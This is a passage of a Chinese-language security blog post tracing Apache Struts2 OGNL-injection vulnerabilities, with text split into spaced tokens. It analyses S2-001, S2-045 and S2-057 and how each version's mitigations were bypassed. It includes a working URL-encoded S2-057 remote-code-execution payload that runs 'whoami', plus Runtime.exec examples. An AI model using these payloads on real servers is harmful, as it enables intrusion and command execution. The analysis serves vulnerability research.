\u3002 \u5230 \u8fd9\u91cc \u6211\u4eec \u5c31 \u5f15\u5165 \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \uff0c \u770b \u540e\u7eed \u7684 \u4e00\u4e2a \u5904\u7406   org . apache . struts2 . dispatcher . StrutsResultSupport # execute   \u5230 \u8fd9\u91cc \uff0c \u5c31 \u5f00\u59cb \u719f\u6089 \u8d77\u6765 \u719f\u6089\u8d77\u6765 \u4e86 \uff0c \u5c31\u662f S2 - 012 \u7684 \u6f0f\u6d1e \u89e6\u53d1 \u70b9   \u4f20\u5165 \u4e86   TextParseUtil . translateVariables   \uff0c \u5230 \u8fd9\u91cc \u5c31 \u7ed3\u675f \u4e86 \uff0c \u540e\u7eed \u5c06 \u8c03\u7528 OGNL . getValue   POC   \u5728 2.3 . x \u7248\u672c \uff0c \u53ef\u4ee5 \u76f4\u63a5 \u7528 S2 - 045 \u7684 poc \u6253   / % 24% 7B% 28% 23dm% 3D @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS% 29 .% 28% 23ct% 3D% 23request% 5B% 27struts . valueStack% 27% 5D . context% 29 .% 28% 23cr% 3D% 23ct% 5B% 27com . opensymphony . xwork2 . ActionContext . container% 27% 5D% 29 .% 28% 23ou% 3D% 23cr . getInstance% 28 @ com . opensymphony . xwork2 . ognl . OgnlUtil @ class% 29% 29 .% 28% 23ou . getExcludedPackageNames% 28% 29 . clear% 28% 29% 29 .% 28% 23ou . getExcludedClasses% 28% 29 . clear% 28% 29% 29 .% 28% 23ct . setMemberAccess% 28% 23dm% 29% 29 .% 28% 23cmd% 3D% 27whoami% 27% 29 .% 28% 23iswin% 3D% 28 @ java . lang . System @ getProperty% 28% 27os . name% 27% 29 . toLowerCase% 28% 29 . contains% 28% 27win% 27% 29% 29% 29 .% 28% 23cmds% 3D% 28% 23iswin% 3F% 7B% 27cmd% 27% 2C% 27 / c% 27% 2C% 23cmd% 7D% 3A% 7B% 27 / bin / bash% 27% 2C% 27 - c% 27% 2C% 23cmd% 7D% 29% 29 .% 28% 23p% 3Dnew% 20java . lang . ProcessBuilder% 28% 23cmds% 29% 29 .% 28% 23p . redirectErrorStream% 28true% 29% 29 .% 28% 23process% 3D% 23p . start% 28% 29% 29 .% 28% 23ros% 3D% 28 @ org . apache . struts2 . ServletActionContext @ getResponse% 28% 29 . getOutputStream% 28% 29% 29% 29 .% 28 @ org . apache . commons . io . IOUtils @ copy% 28% 23process . getInputStream% 28% 29% 2C% 23ros% 29% 29 .% 28% 23ros . flush% 28% 29% 29% 7D / s2057 . action   \u800c \u5bf9\u4e8e 2.5 . x \u7248\u672c \uff0c \u6211\u4eec \u9700\u8981 \u597d\u597d \u5206\u6790 \u4e00\u4e0b   $   {   (   #   ct   =   #   request   [   '   struts   .   valueStack   '   ]   .   context   ) .   (   #   cr   =   #   ct   [   '   com   .   opensymphony   .   xwork2   .   ActionContext   .   container   '   ]   ) .   (   #   ou   =   #   cr   .   getInstance   (   @ com . opensymphony . xwork2 . ognl . OgnlUtil @ class   ) ) .   (   #   ou   .   setExcludedClasses   (   ' '   ) ) .   (   #   ou   .   setExcludedPackageNames   (   ' '   ) ) .   (   #   dm   =   @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   ) .   (   #   ct   .   setMemberAccess   (   #   dm   ) ) . (   #   cmd   =   '   whoami   '   ) .   (   #   iswin   =   (   @ java . lang . System @ getProperty   (   '   os   .   name   '   ) .   toLowerCase   ( ) .   contains   (   '   win   '   ) ) ) .   (   #   cmds   =   (   #   iswin   ?   {   '   cmd   ' , '   /   c   '   ,   #   cmd   } : {   '   /   bin   /   bash   ' , '   -   c   '   ,   #   cmd   } ) ) .   (   #   p   =   new   java   .   lang   .   ProcessBuilder   (   #   cmds   ) ) . (   #   p   .   redirectErrorStream   (   true   ) ) .   (   #   process   =   #   p   .   start   ( ) ) .   (   #   ros   =   (   @ org . apache . struts2 . ServletActionContext @ getResponse   ( ) .   getOutputStream   ( ) ) ) .   (   @ org . apache . commons . io . IOUtils @ copy   (   #   process   .   getInputStream   ( ) ,   #   ros   ) ) . (   #   ros   .   flush   ( ) )   }   \u4ece poc \u6765\u770b \uff0c \u4ece \u7b2c 7 \u884c \u5f00\u59cb \u90fd \u662f \u6211\u4eec \u719f\u6089 \u7684 \u64cd\u4f5c \uff0c \u90a3\u4e48 \u524d\u9762 \u591a \u4e86 \u90a3\u4e48 \u591a \u662f \u5728 \u505a \u4ec0\u4e48 \uff1f   \u53c2\u8003 \uff1a https : / / paper . seebug . org / 794 / # 35 - struts - 2516   \u5728 struts2   2.5 . 13 \u7248\u672c \u4e4b\u540e \uff0c ognl \u5e93 \u8fdb\u884c \u4e86 \u66f4\u65b0 \uff0c \u4ece 3.1 . 12 - > 3.1 . 15 \uff0c \u5176 \u4e3b\u8981 \u7684 \u4e00\u4e2a \u53d8\u5316 \u662f \u7981\u6b62 \u8bbf\u95ee   context . map   \uff0c OgnlContext \u7684 get \u3001 put \u3001 remove \u51fd\u6570 \u4e2d \u90fd \u5220\u9664 \u4e86 \u5bf9 \u5f53\u524d context \u7684 \u64cd\u4f5c   \u6b64\u5916 \uff0c excluded \u76f8\u5173 \u7684 \u96c6\u5408 \u88ab \u8bbe\u7f6e \u4e3a \u4e0d\u53ef \u53d8 \uff0c \u65e0\u6cd5 \u901a\u8fc7 clear \u7684 \u65b9\u5f0f \u6765 \u6e05\u9664   \u9488\u5bf9 \u4e0a\u9762 \u4e24\u79cd \u7684 \u7ed5\u8fc7   \u6587\u7ae0 \u63d0\u51fa \u4e86 \u8fd9\u4e48 \u4e00\u79cd \u601d\u8def :   \u6ca1\u6709 \u529e\u6cd5 \u4f7f\u7528   context . map   \uff0c \u53ef\u4ee5 \u8c03\u7528   attr   \uff0c \u524d \u6587\u8bf4 \u8fc7   attr   \u4e2d \u4fdd\u5b58 \u7740 \u6574\u4e2a   context   \u7684 \u53d8\u91cf \u4e0e \u65b9\u6cd5 \uff0c \u53ef\u4ee5 \u901a\u8fc7   attr   \u4e2d \u7684 \u65b9\u6cd5 \u8fd4\u56de \u7ed9 \u6211\u4eec \u4e00\u4e2a   context . map   \u3002   \u6ca1\u6709 \u529e\u6cd5 \u76f4\u63a5 \u8c03\u7528   excludedClasses   \uff0c \u4e5f \u5c31 \u4e0d\u80fd \u4f7f\u7528   clear   \u65b9\u6cd5 \u6765 \u6e05\u7a7a \uff0c \u4f46\u662f \u8fd8 \u53ef\u4ee5 \u5229\u7528   setter   \u6765 \u628a   excludedClasses   \u7ed9 \u8bbe\u7f6e \u6210\u7a7a   \u6e05\u7a7a \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u5229\u7528   DefaultMemberAccess   \u6765 \u8986\u76d6   _ memberAccess   \uff0c \u6765 \u6267\u884c \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u4e86 \u3002   \u800c \u8fd9\u91cc \u53c8 \u4f1a \u51fa\u73b0 \u4e00\u4e2a \u95ee\u9898 \uff0c \u5f53 \u6211\u4eec \u4f7f\u7528   OgnlUtil   \u7684   setExcludedClasses   \u548c   setExcludedPackageNames   \u5c06 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7f6e \u7a7a\u65f6 \u5e76\u975e \u662f \u5bf9\u4e8e \u6e90 \uff08 \u5168\u5c40 \u7684 OgnlUtil \uff09 \u8fdb\u884c \u7f6e\u7a7a \uff0c \u5c31\u662f \u5c31\u662f\u8bf4 \u4e5f\u5c31\u662f\u8bf4   _ memberAccess   \u662f \u6e90 \u6570\u636e \u7684 \u4e00\u4e2a \u5f15\u7528 \uff0c \u5c31 \u50cf \u524d\u6587 \u6240\u8bf4 \u7684 \uff0c \u5728 \u6bcf\u6b21   createAction   \u65f6 \u90fd \u662f \u901a\u8fc7   setOgnlUtil   \u5229\u7528 \u5168\u5c40 \u7684 \u6e90 \u6570\u636e \u521b\u5efa \u4e00\u4e2a \u5f15\u7528 \uff0c \u8fd9\u4e2a \u5f15\u7528 \u5c31\u662f \u4e00\u4e2a   MemberAccess   \u5bf9\u8c61 \uff0c \u4e5f \u5c31\u662f   _ memberAccess   \u3002 \u6240\u4ee5 \u8fd9\u91cc \u53ea\u4f1a \u5f71\u54cd \u8fd9\u6b21 \u8bf7\u6c42 \u7684   OgnlUtil   \u800c \u5e76\u672a \u91cd\u65b0 \u521b\u5efa \u4e00\u4e2a \u65b0 \u7684   _ memberAccess   \u5bf9\u8c61 \uff0c \u6240\u4ee5 \u65e7 \u7684   _ memberAccess   \u5bf9\u8c61 \u4ecd \u672a \u6539\u53d8 \u3002   \u800c \u7a81\u7834 \u8fd9\u79cd \u9650\u5236 \u7684 \u65b9\u5f0f \u5c31\u662f \u518d\u6b21 \u53d1\u9001 \u4e00\u4e2a \u8bf7\u6c42 \uff0c \u5c06 \u4e0a \u4e00\u6b21 \u8bf7\u6c42 \u5df2\u7ecf \u7f6e\u7a7a \u7684   OgnlUitl   \u4f5c\u4e3a \u6e90 \u91cd\u65b0 \u521b\u5efa \u4e00\u4e2a   _ memberAccess   \uff0c \u8fd9\u6837 \u5728 \u7b2c\u4e8c \u4e8c\u6b21 \u7b2c\u4e8c\u6b21 \u8bf7\u6c42 \u4e2d   _ memberAccess   \u5c31\u662f \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u88ab \u7f6e \u7a7a \u7684 \u60c5\u51b5 \uff0c \u8fd9\u4e2a \u65f6\u5019 \u5c31 \u91ca\u653e \u4e86   DefaultMemberAccess   \uff0c \u5c31 \u53ef\u4ee5 \u8fdb\u884c \u6b63\u5e38 \u7684 \u8986\u76d6 \u4ee5\u53ca \u6267\u884c \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u3002   \u770b\u8fc7 \u4e0a\u9762 \u7684 \u5206\u6790 \u540e \u518d \u6765\u770b poc \uff0c \u7b2c\u4e8c \u4e8c\u884c \u7b2c\u4e8c\u884c \u83b7\u53d6 \u4e86 context \uff0c \u7b2c 3   4   5   6 \u884c \u6e05\u9664 \u4e86 excluded \u76f8\u5173 \u7684 \u96c6\u5408 \uff0c \u4f46 \u5176 \u5f53\u524d \u7684 \u8bf7\u6c42 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u8fd8\u662f \u5b58\u5728 \u7684 \uff0c \u6240\u4ee5 \u5728 2.5 . x \u7248\u672c \u6211\u4eec \u9700\u8981 \u53d1\u9001 \u4e24\u6b21 \u8fd9\u4e2a poc \uff0c \u7b2c\u4e00 \u4e00\u6b21 \u7b2c\u4e00\u6b21 \u6e05\u695a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u7b2c\u4e8c \u4e8c\u6b21 \u7b2c\u4e8c\u6b21 \u8986\u76d6   _ memberAccess   \u5e76 \u8c03\u7528 \u9759\u6001 \u51fd\u6570   0x03   \u603b\u7ed3   \u5728 \u5206\u6790 \u8fc7\u7a0b \u4e2d \uff0c \u53c2\u8003 \u4e86 \u5f88\u591a \u5e08\u5085 \u4eec \u7684 \u7b14\u8bb0 \uff0c \u8fd9\u91cc \u7279\u522b \u611f\u8c22 \u7279\u522b\u611f\u8c22 \u4e00\u4e0b XD   \u4ece \u6574\u4e2a s2 \u6f0f\u6d1e \u7684 \u5386\u7a0b \u6765\u770b \uff0c \u80fd \u770b\u5230 \u5f88\u591a \u6f0f\u6d1e \u5176\u5b9e \u5229\u7528 \u70b9 \u662f \u76f8\u4f3c \u7684 \uff0c \u53ea\u662f \u8bf4 \u4ece \u54ea\u4e2a \u5165\u53e3 \u8fdb\u53bb \u53ef\u80fd \u6709\u6240 \u4e0d\u540c \u6709\u6240\u4e0d\u540c \u3002 \u8fd9\u79cd \u6f0f\u6d1e \u7684 \u5206\u6790 \u6211 \u8ba4\u4e3a \u7528 \u6570\u636e \u6570\u636e\u6d41 \u5206\u6790 \u662f \u975e\u5e38 \u5408\u9002 \u7684 \u3002 lgtm \u7684 \u5e08\u5085 \u5c31 \u7528 \u4e86 \u4ed6\u4eec \u7684 codeql \u53d1\u73b0 \u4e86 S2 - 057 \u8fd9\u4e2a \u6f0f\u6d1e \u3002   \u4f46\u662f \u5b98\u65b9 \u5728 \u4e00\u6b21 \u6b21\u6b21 \u4e00\u6b21\u6b21 \u4fee\u590d \u4e2d \uff0c \u5bf9\u4e8e ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c \u9650\u5236 \u7684 \u8d8a\u6765 \u8d8a\u6765\u8d8a \u591a \uff0c \u4f7f\u5f97 \u5982\u4eca \u5c31\u7b97 \u51fa\u73b0 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6ce8\u5165 \u4e5f \u5f88 \u96be \u9020\u6210 RCE \u7684 \u6548\u679c \u3002   \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u770b   lucifaer   \u5e08\u5085 \u7684 \u90a3 \u6587\u7ae0 \u7bc7\u6587\u7ae0   \u4ece \u65f6\u95f4 \u7ebf \u6765\u770b \uff0c   struts2   2.3 . 14.1 \u4e4b\u524d \uff0c ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u6ca1\u6709 \u4ec0\u4e48 \u969c\u788d \uff1b 2.3 . 14.1 \u589e\u52a0 \u4e86   SecurityMemberAccess   \uff0c \u7981\u6b62 \u9759\u6001 \u51fd\u6570 \u6267\u884c   allowStaticMethodAccess = false   \uff0c \u5728 ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u91cc\u9762 \u53ef\u4ee5 \u91cd\u65b0 \u7f6e \u4e3a true \uff1b \u540e\u7eed \u8fd9\u4e2a \u503c \u88ab \u6539\u6210 \u4e86 final \uff0c \u65e0\u6cd5 \u88ab \u66f4\u6539   struts2   2.3 . 20 \u4e4b\u524d \uff0c \u867d\u7136 \u4e0d\u80fd \u6539   allowStaticMethodAccess   \uff0c \u4f46\u662f \u53ef\u4ee5 \u901a\u8fc7 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u7684 \u65b9\u5f0f \u7ed5\u8fc7 \uff1b 2.3 . 20 \u4e4b\u540e \uff0c \u589e\u52a0 \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355   struts2   2.3 . 29 \u4e4b\u524d \uff0c \u901a\u8fc7   #_ memberAccess = @ ognl . OgnlContext @ DEFAULT _ MEMBER _ ACCESS   \u8fd9\u79cd \u65b9\u5f0f \u521d\u59cb \u521d\u59cb\u5316 \uff0c \u6e05\u7a7a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff1b 2.3 . 29 \u4e4b\u540e \uff0c \u65b0\u589e \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u9650\u5236 \u4e86 \u8fd9\u79cd \u65b9\u5f0f \u7684 \u6267\u884c   struts2   2.3 . 34 / 2.5 . 16 \u4e4b\u524d \uff0c \u901a\u8fc7 container \u5b9e\u4f8b \u5316   ognlUtil   \uff0c \u6e05\u7a7a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u8be6\u7ec6 \u89c1 S2 - 045 \uff1b \u4e4b\u540e \u7981\u6b62 \u4e86 context . map \u7684 \u8bbf\u95ee \u548c excludedClasses \u4e0d\u53ef \u53d8 \uff0c \u4e0d\u80fd \u901a\u8fc7 clear \u6e05\u695a   struts2   2.5 . 17 \u4e4b\u524d \uff0c \u901a\u8fc7 request \u4e2d \u83b7\u53d6 context \uff0c \u7ed5\u8fc7 context . map \u7981\u6b62 \u8bbf\u95ee \u7684 \u9650\u5236 \uff0c \u8be6\u7ec6 \u89c1 S2 - 057 \uff1b \u4e4b\u540e \u65b0\u589e \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff0c \u5b8c\u5168 \u7981\u6b62 \u901a\u8fc7 ognl \u7684 \u5305\u6765 \u5bf9 stack \u505a \u64cd\u4f5c   \u540e\u7eed \u51e0\u4e2a \u7248\u672c \u4e5f \u66f4\u65b0 \u4e86 \u5f88\u591a \u5b89\u5168 \u63aa\u65bd \u5b89\u5168\u63aa\u65bd \uff0c \u5177\u4f53 \u89c1 lucifaer \u5e08\u5085 \u7684 \u6587\u7ae0   \u5728 \u5206\u6790 \u5b8c struts2 \u4e4b\u540e \uff0c \u4e5f \u6539\u53d8 \u4e86 \u5bf9 \u5f88 \u6709\u540d \u7684 \u6f0f\u6d1e \u7684 \u611f\u5b98 \uff0c \u4ee5\u524d \u603b \u89c9\u5f97 struts \u6f0f\u6d1e \u90fd \u662f \u6bd4\u8f83 \u590d\u6742 \u6bd4\u8f83\u590d\u6742 \u7684 \uff0c \u4f46\u662f \u73b0\u5728 \u60f3\u60f3 \u6709 \u7cbe\u5f69 \u590d\u6742 \u7684 \u5730\u65b9 \u4e5f \u4f1a \u6709 \u5f88\u50bb \u7684 \u5730\u65b9 \u3002   \u4e0d\u80fd \u5bf9 \u8fd8 \u6ca1\u6709 \u5206\u6790 \u8fc7 \u7684 \u6846\u67b6 \u6216\u8005 \u5e94\u7528 \u6301\u6709 \u754f\u60e7 \u4e4b\u5fc3 \uff0c \u5171\u52c9 XD","title":"struts2 \u5386\u53f2 \u6f0f\u6d1e \u5206\u6790"},{"location":"blog/2020/talk_about_struts2/#0x00","text":"17 \u5e74 \u7684 \u65f6\u5019 \u6574\u7406 \u8fc7 struts2 \u76f8\u5173 \u7684 POC \uff0c \u65f6\u9694 3 \u5e74 \uff0c \u867d\u7136 struts2 \u5df2\u7ecf \u4e0d\u518d \u90a3\u4e48 \u6d41\u884c \u4e86 \uff0c \u4f46\u662f \u8fd8\u662f \u6709 \u5f88\u5927 \u7684 \u7814\u7a76 \u4ef7\u503c \uff0c \u672c\u6587 \u5c06 \u4e00\u70b9 \u4e00\u70b9 \u4e00\u70b9\u4e00\u70b9 \u8ddf \u4e00\u4e0b struts2   \u6709 \u4ef7\u503c \u7684 \u6f0f\u6d1e XD","title":"0x00   \u524d\u8a00"},{"location":"blog/2020/talk_about_struts2/#0x01","text":"struts2   \u6e90\u7801 \u4e0b\u8f7d https : / / archive . apache . org / dist / struts / source /   struts2 \u5de5\u4f5c \u6d41\u7a0b   https : / / blog . csdn . net / snow _ 7 / article / details / 51513381   ognl \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f https : / / www . cnblogs . com / renchunxiao / p / 3423299 . html   struts2   \u6280\u672f \u5185\u5e55   \u7b2c 6 \u7ae0   OGNL   struts2 \u6f0f\u6d1e \u7684 \u4ea7\u751f \u901a OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6267\u884c \u6709 \u5f88\u5927 \u7684 \u5173\u8054 \uff0c \u5386\u53f2 \u4e0a \u5f88\u591a \u7248\u672c \u7684 \u6f0f\u6d1e \uff0c \u90fd \u56e0\u4e3a \u662f\u56e0\u4e3a \u4e0d \u5b89\u5168 \u7684 \u7528\u6237 \u8f93\u5165 \u6d41\u8f6c \u5230 \u4e86   Ognl . getValue   \u3001   Ognl . setValue   \u800c \u5bfc\u81f4 \u7684 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u8ba1\u7b97 \u3002 \u540e\u6587 \u4e0d \u5bf9 Ognl \u540e\u7eed \u7684 \u5185\u5bb9 \u505a \u5206\u6790   / /   \u8c03\u7528 \u9759\u6001 \u51fd\u6570   \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4   Ognl   .   getValue   (   \" @ java . lang . Runtime @ getRuntime ( ) . exec ( ' open   / Applications / Calculator . app / ' ) \"   ,   context   ) ;   Ognl   .   setValue   (   \" ( \\ \" @ java . lang . Runtime @ getRuntime ( ) . exec ( \\ ' open   / System / Applications / Calculator . app / \\ ' ) \\ \" ) ( bla ) ( bla ) \"   ,   context   ,   \" \"   ) ;   \u66f4 \u591a \u7528\u6cd5 \u770b http : / / commons . apache . org / proper / commons - ognl / language - guide . html   \u5176\u4e2d \u5173\u4e8e   setValue   \u7684 \u5229\u7528 \u7528 \u7684 \u662f Expression   Evaluation \u90e8\u5206 \uff0c   ( 1 ) ( 2 ) ( 3 )   \u4e2d   ( 1 ) ( 2 )   \u88ab \u4f5c\u4e3a \u4e00\u4e2a \u6574\u4f53 \u89e3\u6790 \uff0c \u5bf9\u4e8e   ( 1 )   \u505a \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u89e3\u6790 \uff0c \u5982\u679c \u4f60 \u7528   getValue ( ( 1 ) ( 2 ) )   \u4f1a \u53d1\u73b0 \u5176\u5b9e \u4e5f \u80fd \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \uff0c \u800c   setValue ( ( 1 ) ( 2 ) ( 3 ) )   \u9700\u8981 double   evaluation \uff0c \u5b9e\u9645 \u5b9e\u9645\u4e0a \u53d8\u6210   ( ( 1 ) ( 2 ) ) ( 3 )   \uff0c \u5728 \u540e\u7eed \u8c03\u7528   setValueBody   \u51fd\u6570 \u65f6 \u53d6\u51fa \u7684   children [ 0 ]   \u5c31\u662f   ( 1 ) ( 2 )   \uff0c \u7b49\u540c \u540c\u4e8e \u7b49\u540c\u4e8e \u8c03\u7528   Ognl . getValue ( ( 1 ) ( 2 ) )   \u7684 \u6548\u679c \u3002 \u6240\u4ee5 \u8fd9\u91cc \u8c03\u7528   setValue   \u4e5f \u540c\u6837 \u53ef\u4ee5 \u8fbe\u6210   getValue   \u7684 \u8ba1\u7b97 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6548\u679c \u3002   \u540c\u6837 \uff0c \u6211\u4eec \u4e5f \u53ef\u4ee5 \u5229\u7528   children [ 1 ]   \u7684 \u4f4d\u7f6e \uff0c \u5982   ( 1 ) ( ( 2 ) ( 3 ) )   \u628a payload \u653e\u5230   ( 2 ) ( 3 )   \u5173\u4e8e   setValue   \u51fd\u6570 \u7684 \u53e6 \u4e00\u79cd \u5229\u7528 \u65b9\u6cd5 S2 - 009 \u7684 \u65b9\u5f0f   a [ ( 1 ) ( 2 ) ]   \uff0c \u5176\u4e2d   ( 1 ) ( 2 )   \u540e\u7eed \u4f1a \u5355\u72ec \u62ff \u51fa\u6765 \u88ab \u5f53\u4f5c OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u6267\u884c \u3002","title":"0x01   \u57fa\u7840"},{"location":"blog/2020/talk_about_struts2/#0x02","text":"","title":"0x02   \u5386\u53f2 \u7248\u672c \u56de\u987e"},{"location":"blog/2020/talk_about_struts2/#1-s2-001","text":"\u53c2\u8003 \uff1a https : / / xz . aliyun . com / t / 2044   \u6f0f\u6d1e \u4ea7\u751f \u539f\u56e0 \u5728\u4e8e \uff1a \u7528   < s : textfield >   \u6807\u7b7e \uff0c \u539f\u6837 \u8fd4\u56de \u7528\u6237 \u8f93\u5165 \u65f6 \uff0c \u4f1a\u8fc7 \u4e00\u6b21 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u89e3\u6790 \u6267\u884c \u3002 \u6bd4\u5982 \u573a\u666f \u767b\u9646 \u7684 \u5730\u65b9 \uff0c \u7528\u6237 \u6237\u540d \u7528\u6237\u540d \u5bc6\u7801 \u6821\u9a8c \u9519\u8bef \uff0c \u4e0d \u8df3\u8f6c \u9875\u9762 \uff0c \u76f4\u63a5 \u5c06 \u7528\u6237 \u6237\u540d \u7528\u6237\u540d \u548c \u5bc6\u7801 \u653e\u5230 \u9875\u9762 \u89e3\u6790 \u540e \u8fd4\u56de \u3002   source :   \u4f7f\u7528 \u4e86   s : textfield   \u6807\u7b7e \u7528\u4e8e \u8868\u5355 \u751f\u6210 \uff0c \u5f53 \u7528\u6237 \u8f93\u5165 \u4e0d \u5408\u6cd5 \u65f6 \uff0c \u5c06 \u7528\u6237 \u7684 \u8f93\u5165 \u5185\u5bb9 \u6e32\u67d3 \u5230 \u8fd4\u56de \u7684 \u9875\u9762 \u4e0a   sink :   jsp \u6e32\u67d3 \u8c03\u7528   doEndTag   \uff0c \u540e\u7eed \u7531\u4e8e \u8bc6\u522b \u51fa \u7528\u6237 \u8f93\u5165 \u4e2d OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u800c \u8c03\u7528   Ognl . getValue","title":"1 .   S2 - 001"},{"location":"blog/2020/talk_about_struts2/#_1","text":"\u4e3b\u8981 \u51fa \u95ee\u9898 \u7684 \u662f JSP \u4e2d   < s : textfield >   \u6807\u7b7e \uff0c Struts2 \u91cc \u5904\u7406 textfield \u7684 \u662f   org . apache . struts2 . components . UIBean   \u770b\u5230 \u5728 \u5904\u7406 params \u65f6 \uff0c \u5f53 parameters \u91cc \u4e0d \u5b58\u5728   value   \u8fd9\u4e2a key \u7684 \u65f6\u5019 \uff0c \u4f1a \u8fdb\u5230 \u6267\u884c name \u76f8\u5bf9 \u5e94 \u7684 value \u4e0a\u6765 \u3002 \u5e76\u4e14   altSyntax   \u9ed8\u8ba4 \u914d\u7f6e \u4e3a   true   \u4f1a \u5728 \u5f53\u524d \u7684   name   \u5de6\u53f3 \u52a0\u4e0a OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u6807\u8bc6   % { name }   \uff0c \u8fd9\u91cc \u7684 name \u662f   < s : textfield   name = \" name \"   \uff0c name \u5b57\u6bb5 \u7684 \u503c \uff0c \u6bd4\u5982 \u8fd9\u91cc   name = \" username \"   \uff0c \u6b64\u65f6 \u4f1a \u53d8\u6210   % { username }   . \u7ee7\u7eed \u5f80\u4e0b \u8ddf   \u8fd9\u91cc \u7684 String \u7c7b\u578b \u7684 \u8f6c\u5316 \u4e3b\u8981 \u7528 \u4e86   TextParesUtil . translateVariables ( )   \u6765 \u5904\u7406 \uff0c \u8fd9\u91cc \u770b\u770b \u5177\u4f53 \u4ed6 \u600e\u4e48 \u505a \u7684   com . opensymphony . xwork2 . util . TextParseUtil # translateVariables # 97   \u8fd9\u91cc \u4f1a \u53bb \u5224\u65ad \u4f20\u5165 \u7684 expression \u662f\u5426 \u662f\u5426\u662f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u683c\u5f0f \u7684   % { xxx }   \uff0c \u5982\u679c \u662f \u7684\u8bdd \uff0c \u5c31 \u4f1a \u53bb   OgnlValueStack   \u91cc\u9762 \u53bb \u627e \u5bf9\u5e94 \u7684 \u5185\u5bb9 ( \u8fd9\u5757 \u5c31\u662f OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u7684 \u8ba1\u7b97 \u7ed3\u679c \u8ba1\u7b97\u7ed3\u679c \uff0c   findValue   \u51fd\u6570 \u540e\u7eed \u4f1a \u53bb \u8c03\u7528   OgnlUtil . getValue   \uff0c \u8be6\u7ec6 \u7684 \u53ef\u4ee5 \u770b \u6211 \u57fa\u7840 \u91cc\u5217 \u7684 \u6587\u7ae0 )   \u6240\u4ee5 \u8fd9\u91cc \u6211\u4eec \u7b2c\u4e00 \u4e00\u904d \u7b2c\u4e00\u904d \u4f20\u5165 \u7684   % { name }   \u4f1a \u89e3\u6790 \u83b7\u5f97 \u5bf9\u5e94 \u7684 \u503c   % { @ java . lang . Runtime ..... }   \u7b2c\u4e8c \u4e8c\u904d \u7b2c\u4e8c\u904d \u4f1a \u53bb \u89e3\u6790   % { @ java . lang . Runtime .... }   \uff0c \u8fd9\u91cc \u6267\u884c \u4e86 \u6211\u4eec \u60f3\u8981 \u6267\u884c \u7684 \u547d\u4ee4 \u3002","title":"\u6f0f\u6d1e \u5206\u6790"},{"location":"blog/2020/talk_about_struts2/#poc","text":"\u524d\u9762 \u7b80\u5355 \u7528 \u4e86 OGNL \u8868\u8fbe \u8fbe\u5f0f \u8868\u8fbe\u5f0f \u8c03\u7528 \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5 \u7684 \u5f62\u5f0f \u6765 \u6267\u884c \u7cfb\u7edf \u547d\u4ee4 \u7cfb\u7edf\u547d\u4ee4   @ java . lang . Runtime @ getRuntime ( ) . exec ( command )   \u8fd9\u91cc S2 - 001 \u5176\u5b9e \u662f \u4f1a \u76f4\u63a5 \u56de\u663e \u7684 \uff0c \u5c06 \u66ff\u6362 \u539f\u6709 \u7684 input \u6807\u7b7e \u7684 \u5185\u5bb9 \uff0c \u8fd9\u91cc \u6362 \u4e00\u79cd \u65b9\u5f0f \u6765 \u8fdb\u884c \u56de\u663e \uff0c \u5229\u7528 Struts2 \u7684 HttpServletResponse \u6765 \u5199\u5165 \u5185\u5bb9 \u3002   # writer = # context . get ( \" com . opensymphony . xwork2 . dispatcher . HttpServletResponse \" ) . getWriter ( ) ,   # writer . println ( xxxxxx ) ,   # writer . flush ( ) ,   # writer . close ( )   \u5148 \u4ece \u4e0a\u4e0b \u4e0b\u6587 \u4e0a\u4e0b\u6587 context \u4e2d \u53d6\u51fa   HttpServletResponse   \u7684 \u5b9e\u4f8b \uff0c \u7528\u5230 \u7684 \u5b9e\u9645 \u662f   HttpServletResponseWrapper   \u7136\u540e \u83b7\u53d6 \u5f53\u524d response \u7684 writer \u5bf9\u8c61 \uff0c \u5728 \u5229\u7528 \u8be5 writer \u6765 \u5199\u5165 \u4efb\u610f \u5185\u5bb9   